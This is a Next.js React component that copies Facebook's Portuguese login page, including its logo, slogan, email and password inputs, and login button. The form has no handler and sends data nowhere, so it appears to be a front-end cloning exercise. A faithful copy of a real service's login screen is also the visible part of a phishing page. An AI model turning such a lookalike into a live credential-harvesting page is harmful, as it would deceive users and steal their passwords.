import Layout from "../componentes/Layout";
import Image from "next/image";
import Footer from "../componentes/Footer";

function HomePage() {
	return (
		<Layout>
			<div className="container mx-auto">
				<div className="w-full flex flex-col justify-end items-center md:flex-row lg:flex-row">
					<div className="container">
						<Image src="/fb2.svg" width="301" height="106" />
						<h2
							className="ml-7"
							style={{
								fontFamily:
									"SFProDisplay-Regular, Helvetica, Arial, sans-serif",
								fontSize: "28px",
								fontWeight: "normal",
								lineHeight: "32px",
								width: "500px",
							}}
						>
							O Facebook ajuda-te a comunicar e a partilhar com as pessoas que
							fazem parte da tua vida.
						</h2>
					</div>
					<div className="container">
						<div
							className="flex h-2/6 justify-center"
							style={{ backgroundColor: "#f0f2f5" }}
						>
							<div className="flex flex-col mt-10" style={{ width: "396px" }}>
								<Image src="/fb2.svg" width="240" height="85" />
								<div className="rounded-lg border shadow-lg p-3 bg-white ">
									<div
										className="p-3 text-center"
										style={{ fontSize: "18px", lineHeight: "22px" }}
									>
										Início de sessão no Facebook
									</div>
									<div className="mx-1 my-3">
										<input
											className="border-gray-300 border rounded-md "
											style={{
												fontSize: "17px",
												padding: "14px 16px",
												width: "363px",
											}}
											type="text"
											name="email"
											placeholder="E-mail ou número de telemóvel"
										/>
									</div>
									<div className="mx-1 my-3">
										<input
											className="border-gray-300 border rounded-md"
											style={{
												fontSize: "17px",
												padding: "14px 16px",
												width: "363px",
											}}
											type="password"
											name="pass"
											placeholder="Palavra-passe"
										/>
									</div>
									<div className="mx-1 my-2">
										<button
											className="text-white"
											style={{
												backgroundColor: "#1877f2",
												border: "none",
												borderRadius: "6px",
												fontSize: "20px",
												lineHeight: "48px",
												padding: "0 16px",
												width: "363px",
												fontWeight: "bold",
											}}
										>
											Iniciar sessão
										</button>
									</div>
									<div
										className="text-center"
										style={{ padding: "12px 0 18px" }}
									>
										<a href="" className="lgcls">
											Esqueceste-te da tua conta?
										</a>
										<span className="mx-1" style={{ color: "#90949c" }}>
											.
										</span>
										<a href="" className="lgcls">
											Regista-te no Facebook
										</a>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<Footer />
		</Layout>
	);
}

export default HomePage;
